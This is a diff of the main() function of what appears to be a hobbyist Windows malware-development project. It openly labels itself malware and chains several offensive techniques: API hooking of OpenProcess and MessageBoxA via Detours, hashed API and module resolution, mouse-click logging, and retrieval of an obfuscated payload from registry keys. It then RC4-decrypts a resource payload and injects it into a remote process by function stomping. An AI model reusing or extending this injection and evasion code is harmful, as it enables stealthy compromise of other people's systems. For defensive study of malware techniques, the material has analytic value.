@@ -2,6 +2,7 @@
 
 int main()
 {
+	
 	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
 								  hProcess1					= INVALID_HANDLE_VALUE,
 								  hProcess2					= INVALID_HANDLE_VALUE,
@@ -65,21 +66,46 @@ int main()
 								  pwPath[MAX_PATH]			= { };
 	Context						  RC4Context_t				= { };
 	RESOURCE					  resource					= { };
-	PVOID						  fnLMBClick				= static_cast<PVOID>(GetProcAddress(GetModuleHandleW(L"User32.dll"), "GetRawInputBuffer"));
+	PVOID						  fnLMBClick				= nullptr;
+
+	fnOpenProcess GlobalOpenProcess = OpenProcess;
+
+	FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess);
+
+	FetchPathFromRunningProcess(hProcess, reinterpret_cast<LPWSTR*>(&pwPath));
+
+	OpenProcess(PROCESS_ALL_ACCESS, FALSE, 25116);
+
+	HookWithVirtualAlloc(reinterpret_cast<PVOID>(OpenProcess), reinterpret_cast<PVOID>(GlobalOpenProcess), 6);
+
+
+
+	hThread = GetCurrentThread();
+
+	if (HookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 1;
+
+	MessageBoxA(nullptr, "[!] Malware Development Is Fun!\n", "API Hooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);
+
+	if (UnHookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 2;
+
+	MessageBoxA(nullptr, "Malware Development Is Fun!\n", "API UnHooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);
+
+	//MiceHandlesTests();
 
 	pExtPayloadAddress = static_cast<PBYTE>(malloc(20));
 
 	memcpy(pExtPayloadAddress, "Hello World!\0", 13);
 
-	MapLocalMemory(pExtPayloadAddress, &pExPayload, 15, &hHeap);
+
+	//MapLocalMemory(pExtPayloadAddress, &pExPayload, 15, &hHeap);
 
 	LogConsoleMouseClicks();
 
 	pExPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, sBytesWritten, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY));
 
-	HookWithVirtualAlloc(pExPayload, fnLMBClick, sBytesWritten);
-	
-	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
+	HookWithVirtualAlloc(pExPayload, fnLMBClick, static_cast<DWORD>(sBytesWritten));
+
+	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId(), &dwThreadId, &hThread)) return -2;
 
 	//printf("[!] Hashing Strings!\n");
 
@@ -90,8 +116,6 @@ int main()
 	hModuleCustom = GetModuleHandleReplacementH(dwHashedString2);
 
 	GetEnvironmentVariableW(L"WinDir", pwPath, MAX_PATH);
-
-	FetchFileArrayW(pwPath);
 
 	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);
 
@@ -104,7 +128,7 @@ int main()
 	printf("Starting PE Parser...\n");
 
 	if (FetchImageData(const_cast<LPWSTR>(L"C:\\WINDOWS\\System32\\kernel32.dll"), hHeap, &pImageData) == TRUE) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
-	
+
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
 	FetchImageNtHeaders(pImageData, &pImageNtHeaders_t);
@@ -124,16 +148,8 @@ int main()
 	FetchImageFileHeader(pImageData, &pImageFileHeader_t);
 
 	PDWORD pRVAsOfNames = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);
+
 	/*
-	for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) 
-{
-	PDWORD pFuncNameArray = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);
-
-	PCHAR pFuncName = reinterpret_cast<PCHAR>(pImageData + pFuncNameArray[i]);
-
-	printf("%s\n", pFuncName);
-	}
-	*/
 	FetchImageSection(pImageData, &pImageSection_Entry);
 
 	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), const_cast<LPSTR>("NtQuerySystemInformation"));
@@ -144,7 +160,7 @@ int main()
 
 	if (!FetchStompingTarget(const_cast<LPSTR>(SACRIFICIAL_DLL), const_cast<LPSTR>(SACRIFICIAL_FUNC), reinterpret_cast<PVOID * >(&pStompingTarget))) return -10;
 
-	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
+	if (!ReadRegKeys(&pObfOutput, reinterpret_cast<PDWORD>(&sObfuscatedSize))) return -1;
 
 	if ((pKey = static_cast<PUCHAR>(LocalAlloc(LPTR, 256))) == nullptr) return -2;
 
@@ -156,13 +172,13 @@ int main()
 
 	if ((pObfInput = static_cast<PUCHAR>(LocalAlloc(LPTR, resource.sSize))) == nullptr) return -14;
 
-	if (!rInit(&RC4Context_t, pKey, strlen(reinterpret_cast<PCHAR>(pKey)))) return -6;
+	if (rInit(&RC4Context_t, pKey, strlen(reinterpret_cast<PCHAR>(pKey))) == FALSE) return -6;
 
 	rFin(&RC4Context_t, static_cast<PUCHAR>(resource.pAddress), pObfInput, resource.sSize);
 
 	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
 	
-	 for (UCHAR i = 0; i < 8; i++)
+	for (UCHAR i = 0; i < 8; i++)
 	{
 		pOutput[i] = static_cast<CHAR>(pTargetSubDirectory[i] ^ pXorKey[i]);
 	}
@@ -244,9 +260,20 @@ int main()
 	//char pPath[MAX_PATH] = { '\0' };
 
 	printf("[#] Press 'Enter' To Exit! :)");
-
+	*/
 	return 0;
 }
+
+/*
+for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++)
+{
+	PDWORD pFuncNameArray = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);
+
+	PCHAR pFuncName = reinterpret_cast<PCHAR>(pImageData + pFuncNameArray[i]);
+
+	printf("%s\n", pFuncName);
+}
+*/
 
 //CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
 
